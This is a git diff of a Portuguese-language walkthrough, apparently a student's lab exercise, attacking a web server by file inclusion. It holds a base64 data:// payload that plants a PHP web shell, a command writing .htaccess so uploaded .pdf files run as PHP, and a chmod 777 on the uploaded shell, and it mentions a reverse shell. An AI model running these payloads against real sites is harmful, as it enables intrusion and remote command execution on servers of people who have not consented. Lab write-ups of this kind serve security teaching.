@@ -61,6 +61,13 @@ comando que envia pdf malicioso pro site
 
 - agora é so mandar um arquivo de uma prompt de comando .pdf , ou mandar um arquivo direto com o shell reverse
 
+- criando .htaccess (arquivo importante para o funcionamento do cmd)
+
+```
+  http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20%27AddType%20application%2Fx-httpd-php%20.pdf%27%20>%20%2Fvar%2Fwww%2Fhtml%2Fuploads%2F.htaccess
+```
+- agora uptar o prompt de comando pro servidor e testar se funciona
+
 comando que envia o prompt de comando .pdf pro site : 
 
 ```
@@ -78,14 +85,25 @@ comando que envia o prompt de comando .pdf pro site :
 - Agora vamos dar previlegios a esse cmd com o comando: http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=chmod%20777%20/var/www/html/uploads/cmd.pdf
 
 - Antes:
-<img width="364" height="117" alt="image" src="https://github.com/user-attachments/assets/8ff534bb-acc2-4de0-ae18-bfdf4858ec9d" />
+<p align="center">
+  <img width="364" height="117" alt="image" src="https://github.com/user-attachments/assets/8ff534bb-acc2-4de0-ae18-bfdf4858ec9d" />
+</p>
 
 - depois:
-<img width="374" height="137" alt="image" src="https://github.com/user-attachments/assets/7bdde745-c483-49c8-8099-30cf16501345" />
 
+<p align="center">
+  <img width="374" height="137" alt="image" src="https://github.com/user-attachments/assets/7bdde745-c483-49c8-8099-30cf16501345" />
+</p>
 
+- vou deixar uma mensagem de PAZ para garantir que nada de ruim aconteça caso alguem ache que eu vou apagar o servidor inteiro
 
+```
+echo "Olá meu nome é luan , eu nao sou um hacker maligno , sou apenas um estudando da faculdades IESGO meu github é https://github.com/Luanqmata caso alguem encontre este arquivo saiba que eu nao estou mal itencionado apenas , fazendo uma atividade da faculdade , se quiserem entrar em contato , calazanscybersec@gmail.com" > hacked_by_luan.txt
 
+```
+<p align="center">
+  <img width="284" height="135" alt="image" src="https://github.com/user-attachments/assets/7bc73941-7650-47a3-a4b0-c9cc03927e7e" />
+</p>
 
 
 
